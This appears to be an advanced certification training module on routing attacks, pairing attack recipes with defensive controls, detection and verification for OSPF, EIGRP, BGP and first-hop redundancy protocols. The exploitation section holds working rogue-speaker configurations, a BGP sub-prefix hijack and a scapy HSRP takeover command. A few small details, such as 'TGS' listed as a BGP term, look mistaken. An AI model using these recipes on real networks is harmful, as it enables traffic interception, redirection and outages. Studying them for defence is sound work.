# Routing Attacks

> Track: Offensive / Defensive | Level: Advanced | Certs: CCNA, CCNP, CyberOps

## 1. Overview

This file is the attacker-side deep dive into routing. It covers
the specific attacks against OSPF, EIGRP, BGP, HSRP, VRRP, and
GLBP in enough detail to run them in a lab and recognize them in
production. The defensive side is in 05 Routing Defense; the
fundamentals are in 01 and 02.

Three things make routing attacks worth studying in depth:

- The attacker never touches a host. A routing attack changes
  what the network does to traffic, not the traffic itself. Host-
  based monitoring and EDR never see it.
- The attacker needs one working adjacency. Every protocol has
  a neighbor discovery process, and if the attacker can complete
  it, the network trusts the routes that follow.
- The blast radius is the routing domain. A single injected LSA
  can redirect every packet in an OSPF area; a single hijacked
  prefix can take down a multi-tenant service.

The vocabulary: LSA, LSA type, LSDB, SPF, DR/BDR, area, ABR, ASBR
(OSPF); TGS, NLRI, AS path, MED, local preference, route
reflector, community (BGP); hello, hold, K-value, feasible
successor (EIGRP); active, standby, virtual IP, priority,
preempt (HSRP/VRRP/GLBP).

## 2. Reconnaissance / Enumeration

Routing attack reconnaissance is about discovering the protocol,
the peers, and the authentication state.

**What is running on the segment?**

```bash
# Multicast routing protocols (OSPF/EIGRP/RIPv2/HSRP/VRRP)
sudo tcpdump -i eth0 -n -c 200 'ip multicast or ip proto 89 or ip proto 88 or udp port 520'

# BGP is unicast TCP/179
sudo tcpdump -i eth0 -n -c 50 'tcp port 179'

# STP and first-hop redundancy
sudo tcpdump -i eth0 -n -c 50 'ether dst 01:80:c2:00:00:00 or ether dst 01:00:5e:00:00:01 or ether dst 01:00:5e:00:00:02'

```

**Is authentication enabled?**

```bash
# OSPF: the hello packet has an AuType field
sudo tcpdump -i eth0 -n -vv 'ip proto 89' | grep -i auth

# EIGRP: the hello packet has an authentication TLV
sudo tcpdump -i eth0 -n -vv 'ip proto 88' | grep -i auth

# BGP: TCP MD5 is invisible in the packet; check for session failures
nmap -p 179 --script bgp-open 10.10.10.1

```

**What are the peers advertising?**

```text
show ip ospf neighbor
show ip ospf database
show ip bgp summary
show ip bgp
show ip eigrp neighbors
show ip eigrp topology
show standby brief
show vrrp brief

```

**From a foothold: what does the router see?**

```bash
# If the foothold is a Linux router with FRR
sudo vtysh -c "show ip ospf neighbor"
sudo vtysh -c "show ip bgp summary"

# If the foothold is a host, capture the multicast
sudo tcpdump -i eth0 -n 'ip multicast'

```

The output of these commands is the attack surface. A neighbor
that does not require authentication is the target.


## 3. Common Attack Vectors

Routing attacks are grouped by the protocol they target. Each
attack assumes an unauthenticated adjacency; section 6 and 05
Routing Defense cover the authentication that stops them.

**OSPF attacks:**
- Rogue OSPF speaker: complete the adjacency (hello, DBD, LSR,
  LSU, LSAck) and inject LSAs.
- LSA type 1 (router) injection: advertise a fake router with
  links to networks the attacker does not own.
- LSA type 5 (external) injection: an ASBR announces any prefix
  as external type 2.
- Max age attack: flush an LSA by re-advertising it with age 3600.
- DR/BDR election manipulation: set the interface priority to 255
  and become the DR for the segment.
- Virtual link abuse: virtual links are unauthenticated OSPF
  adjacencies over a transit area.

**EIGRP attacks:**
- Rogue EIGRP speaker: same AS number, lower metric, becomes the
  feasible successor and then the successor.
- Route injection: advertise a network as internal.
- K-value mismatch: cause the adjacency to fail (DoS).
- Stuck-in-active: send a query that never gets a reply, forcing
  the route into active state.

**BGP attacks:**
- Prefix hijack: announce a prefix you do not own.
- Sub-prefix hijack: announce a more specific prefix (e.g. /25)
  of a /24 you do not own; longest prefix match wins.
- AS path manipulation: shorter AS path wins, so strip or prepend
  to influence path selection.
- Route leak: re-advertise a route from one peer to another that
  should not see it.
- Session reset: TCP RST to tear down eBGP.
- BGP spoofing: if TCP MD5 is off, a rogue speaker can impersonate
  a peer.

**First-hop redundancy attacks (HSRP/VRRP/GLBP):**
- HSRP active takeover: priority 255 + preempt, or a lower IP.
- VRRP master takeover: priority 255 + preempt.
- GLBP AVG takeover: priority 255 + preempt.
- All three are unauthenticated by default (MD5 is optional).

**Route table exhaustion:**
- Advertise a large number of routes to exhaust FIB/TCAM.
- OSPF: many type 5 LSAs from a rogue ASBR.
- BGP: many prefixes from a rogue peer (max-prefix is the
  defense).

The common thread: every protocol trusts a speaker that speaks
correctly, and none of them authenticate by default.

## 4. Exploitation Recipes

All commands are run only against systems you own or have written
authorization to test.

### Recipe 1 - OSPF rogue speaker with FRRouting

The cleanest OSPF attack is a real OSPF stack.

```bash
# On Kali: install and enable ospfd
sudo apt install frr
sudo sed -i 's/^ospfd=no/ospfd=yes/' /etc/frr/daemons
sudo systemctl restart frr

# Configure a rogue OSPF speaker
sudo vtysh

```

In vtysh:

```text
configure terminal
interface eth0
 ip address 10.10.10.66/24
 ip ospf authentication null
 ip ospf hello-interval 10
 ip ospf dead-interval 40
exit
router ospf
 network 10.10.10.0/24 area 0
 redistribute static
exit
exit
write memory

```

Now add a static route for a network you do not own:

```bash
sudo ip route add 10.20.30.0/24 via 10.10.10.66
sudo vtysh -c "configure terminal" -c "router ospf" -c "redistribute static"

```

Expected effect: every OSPF router in area 0 now has a route to
10.20.30.0/24 pointing at the attacker. Section 6 covers the
authentication that stops this.

### Recipe 2 - OSPF max age attack

Re-advertise an LSA with age 3600 to flush it from every LSDB.

```bash
# This requires the full LSA body from the LSDB
# On a rogue FRR speaker:
sudo vtysh -c "show ip ospf database router 10.10.10.1"
# Re-inject with age 3600 (lab only)

```

Expected effect: the LSA is flushed from every router, and the
routes it described are withdrawn. If the LSA is the only source
for a prefix, that prefix disappears network-wide.

### Recipe 3 - EIGRP rogue speaker

Same idea as OSPF, with EIGRP.

```bash
sudo sed -i 's/^eigrpd=no/eigrpd=yes/' /etc/frr/daemons
sudo systemctl restart frr
sudo vtysh

```

In vtysh:

```text
configure terminal
router eigrp 100
 network 10.10.10.0/24
 redistribute static
exit
exit
write memory

```

Add a static route for a network you do not own. Expected
effect: every EIGRP router in AS 100 now routes that network
through the attacker.

### Recipe 4 - BGP sub-prefix hijack

A sub-prefix hijack is more specific than the legitimate route,
so longest prefix match wins.

```text
! On a rogue BGP speaker:
router bgp 65001
 network 203.0.113.128 mask 255.255.255.128
 neighbor 10.10.10.1 remote-as 65000
 neighbor 10.10.10.1 activate

```

If the legitimate route is 203.0.113.0/24, the /25 is more
specific and wins at every router that receives both. The
legitimate traffic for half the prefix now flows through the
attacker.

### Recipe 5 - HSRP active takeover with scapy

A single HSRP hello with priority 255 and preempt claims the
virtual IP.

```bash
sudo python3 -c "
from scapy.all import *
hsrp = IP(dst='224.0.0.2')/UDP(sport=1985, dport=1985)/HSRP(version=0, opcode=0, state=16, hellotime=3, holdtime=10, priority=255, group=1, virtualIP='10.10.10.1')
send(hsrp, iface='eth0', loop=1, inter=3)
"

```

Expected effect: the attacker becomes the active HSRP gateway.
Every host on the segment now sends traffic for the virtual IP
to the attacker.

## 5. Post-Exploitation

Once you control a route, the post-exploitation options are
about what the route gives you.

**Interception:** a route through the attacker means every packet
on that path is visible. Combined with a rogue CA or plaintext
protocols, this is a full MITM.

**Blackhole:** a route to `null0` drops traffic. A blackhole of a
backup path is a DoS that is hard to notice because the primary
still works.

**Redirection to a rogue service:** a route that sends traffic
for a prefix to the attacker lets the attacker impersonate every
service in that prefix.

**Persistence:** a static route on a compromised router, or a
rogue OSPF/BGP speaker that is not removed, persists across
reboots. It is invisible to host-based monitoring.

**Reporting:** the finding is "the routing protocol accepted an
unauthenticated speaker, and the route it advertised was installed
by every router in the domain". That is a control-plane trust
failure, and it is a critical finding.


## 6. Preventive Controls

Every routing attack in section 3 is stopped by the same idea:
make the speaker prove it is a legitimate peer. The details are
in 05 Routing Defense; this section is the short version as it
applies to the specific attacks.

**OSPF:**

```text
! Enable MD5 or SHA authentication on every interface
interface GigabitEthernet0/1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 <KEY>

! Area-wide
router ospf 1
 area 0 authentication message-digest

! Limit the LSA flood
router ospf 1
 max-lsa 12000

! Passive interface on host-facing ports
router ospf 1
 passive-interface default
 no passive-interface GigabitEthernet0/49

```

**EIGRP:**

```text
key chain EIGRP-KEYS
 key 1
  key-string <KEY>
interface GigabitEthernet0/1
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP-KEYS

! Passive interface on host-facing ports
router eigrp 100
 passive-interface default
 no passive-interface GigabitEthernet0/49

```

**BGP:**

```text
! TCP MD5 or TCP-AO
neighbor 203.0.113.1 password <KEY>

! Prefix filter
ip prefix-list FROM-PEER permit 203.0.113.0/24
ip prefix-list FROM-PEER deny 0.0.0.0/0 le 32
neighbor 203.0.113.1 prefix-list FROM-PEER in

! Max-prefix
neighbor 203.0.113.1 maximum-prefix 1000 90 restart 30

! GTSM (TTL 1 for directly-connected eBGP)
neighbor 203.0.113.1 ttl-security hops 1

! RPKI validation
bgp rpki server tcp 203.0.113.10 port 3323 refresh 600

```

**First-hop redundancy (HSRP/VRRP/GLBP):**

```text
! HSRP
standby 1 authentication md5 key-string <KEY>
standby 1 preempt

! VRRP
vrrp 1 authentication md5 key-string <KEY>
vrrp 1 preempt

! GLBP
glbp 1 authentication md5 key-string <KEY>
glbp 1 preempt

```

**BGP route leak prevention (peer groups):**

```text
! Tag prefixes by peer type
route-map TAG-CUSTOMER permit 10
 set community 65000:100
route-map TAG-PEER permit 10
 set community 65000:200
route-map TAG-TRANSIT permit 10
 set community 65000:300

! Only advertise customer prefixes to peers and transits
route-map TO-PEER permit 10
 match community 65000:100
route-map TO-PEER deny 20

```

**BGP AS path filtering:**

```text
! Reject routes with a bogon AS in the path
ip as-path access-list 10 deny _64512_
ip as-path access-list 10 deny _65535_
ip as-path access-list 10 permit .*
neighbor 203.0.113.1 filter-list 10 in

```

**Infrastructure ACLs (iACL):** protect the control plane by
dropping routing protocol traffic on all interfaces that should
not run it.

```text
! Block OSPF, EIGRP, HSRP, VRRP on host-facing ports
interface range GigabitEthernet0/1-48
 no ip ospf 1 area 0
 no ip hello-interval eigrp 100 5
 no standby 1

! Or with an ACL on the host-facing ports
ip access-list extended HOST-FACING
 deny ospf any any
 deny eigrp any any
 deny udp any any eq 1985
 deny 112 any any
 permit ip any any

```

## 7. Detection Controls

Each attack in section 3 has a matching detection.

**OSPF detection:**
- New OSPF neighbor that was not in the baseline.
- LSA with an unexpected link-state ID or advertising router.
- LSA with age 3600 (max age attack).
- DR/BDR change on a stable segment.
- OSPF authentication failure (a sign of a rogue speaker trying
  to join an authenticated domain).

**EIGRP detection:**
- New EIGRP neighbor that was not in the baseline.
- Route with an unexpected metric or next hop.
- EIGRP authentication failure.
- Stuck-in-active events (a sign of a query flood).

**BGP detection:**
- New BGP peer that was not in the baseline.
- Prefix announced by a peer that should not announce it.
- AS path anomaly (unexpected prepend, unexpected origin AS).
- BGP session flap (a sign of a reset attack).
- RPKI-invalid announcement.
- BGP max-prefix threshold exceeded.

**First-hop redundancy detection:**
- Active/standby state change on a stable segment.
- A new HSRP/VRRP/GLBP speaker that was not in the baseline.
- HSRP/VRRP/GLBP authentication failure.

**Control-plane logging:**

```text
! OSPF
router ospf 1
 log-adjacency-changes detail

! EIGRP
router eigrp 100
 eigrp log-neighbor-changes

! BGP
router bgp 65000
 bgp log-neighbor-changes

! Syslog to a central collector
logging host 10.10.10.50
logging trap informational

```

**SIEM correlation:** the high-value alert is "new routing
peer + new route + traffic to that route". Each event alone is
noise; together they are a control-plane compromise.

## 8. Verification

How to verify that the routing defenses are working.

**Verify OSPF authentication:**

```text
show ip ospf interface GigabitEthernet0/1
! Expect: "Message digest authentication enabled"

```

**Verify EIGRP authentication:**

```text
show ip eigrp interfaces detail GigabitEthernet0/1
! Expect: "Authentication mode is md5"

```

**Verify BGP authentication and prefix filter:**

```text
show ip bgp neighbors 203.0.113.1
! Expect: "Peer Authentication: MD5" or "TCP-AO"
! Expect: "Prefix-list FROM-PEER" in the inbound policy
! Expect: "Maximum-prefix: 1000"

```

**Verify HSRP/VRRP authentication:**

```text
show standby brief
! Expect: "Auth" in the output, not "No Auth"
show vrrp brief
! Expect: "Auth" in the output

```

**Verify iACL:**

```bash
# From a host-facing port, send an OSPF hello
sudo python3 -c "from scapy.all import *; send(IP(dst='224.0.0.5')/OSPF_Hdr(), iface='eth0')"
# Expect: the switch drops it (no neighbor forms)

```

**The verification habit:** after every routing change, re-check
who is a peer, what prefixes are accepted, and whether the
forwarding plane matches the control plane. A silent routing
change is the most common control-plane failure.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 4: Network Security - routing protocol attacks,
  authentication, first-hop security.

**Cisco CCNA (200-301):**
- Domain 3: IP Connectivity - OSPF, first-hop redundancy.
- Domain 5: Security Fundamentals - routing protocol
  authentication, iACL.

**Cisco CyberOps Associate (200-201 CBROPS):**
- Detecting control-plane attacks (routing protocol anomalies,
  BGP hijack indicators).

**Cisco CCNP Enterprise (350-401 ENCOR + 300-410 ENARSI):**
- BGP security (prefix filters, RPKI, max-prefix, GTSM), OSPF
  authentication, route leak prevention.

**Cross-references:**
- 01 Routing Fundamentals covers the routing table and
  administrative distance that every attack manipulates.
- 02 Dynamic Routing Protocols covers OSPF/EIGRP/BGP/RIP
  operation in detail.
- 03 Switching Advanced covers the layer 2 fabric these routes
  traverse.
- 05 Routing Defense covers the defensive controls in depth.

## 10. Production Notes

**Routing attacks are the most under-monitored class of attack.**
Host-based EDR, endpoint logs, and application logs never see
them. The only evidence is in the routing protocol logs and the
forwarding path, and most organizations do not correlate either.

**BGP hijacks happen outside your network.** A prefix hijack is
announced by an AS you do not control, and you cannot block it
with an ACL on your own routers. The only defenses are RPKI
(global attestation) and prefix filtering on your upstreams.

**The blast radius is the routing domain.** A single injected
LSA in OSPF area 0 affects every router in area 0. A single BGP
hijack affects every AS that receives the announcement. This is
why control-plane authentication is the highest-value routing
control, and why it is one line per protocol.

**Route leaks are an accident, not an attack, and they are just
as damaging.** A misconfigured route-map that re-advertises a
full table to a peer can take down a tier-1 network. The
defenses are the same as for a hijack: prefix filters, max-prefix,
and RPKI.

**Cloud routing changes the diagram, not the model.** A VPC route
table is the forwarding plane; the cloud API is the control plane.
The attacks are IAM and API-based, not OSPF/BGP-based. But hybrid
environments still run BGP between the data center and the cloud,
and that session needs the same defenses as any other eBGP.

## 11. References

- RFC 2328 - OSPF Version 2 - https://www.rfc-editor.org/rfc/rfc2328
- RFC 5709 - OSPFv2 HMAC-SHA Cryptographic Authentication - https://www.rfc-editor.org/rfc/rfc5709
- RFC 4271 - A Border Gateway Protocol 4 (BGP-4) - https://www.rfc-editor.org/rfc/rfc4271
- RFC 2385 - Protection of BGP Sessions via the TCP MD5 Signature Option - https://www.rfc-editor.org/rfc/rfc2385
- RFC 5925 - The TCP Authentication Option - https://www.rfc-editor.org/rfc/rfc5925
- RFC 5082 - The Generalized TTL Security Mechanism (GTSM) - https://www.rfc-editor.org/rfc/rfc5082
- RFC 6480 - An Infrastructure to Support Secure Internet Routing (RPKI) - https://www.rfc-editor.org/rfc/rfc6480
- RFC 7454 - BGP Operations and Security (BCP 194) - https://www.rfc-editor.org/rfc/rfc7454
- NIST SP 800-41 Rev. 1 - Guidelines on Firewalls and Firewall Policy - https://csrc.nist.gov/pubs/sp/800/41/r1/final
- Cisco - BGP Best Practices - https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/16149-18.html
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

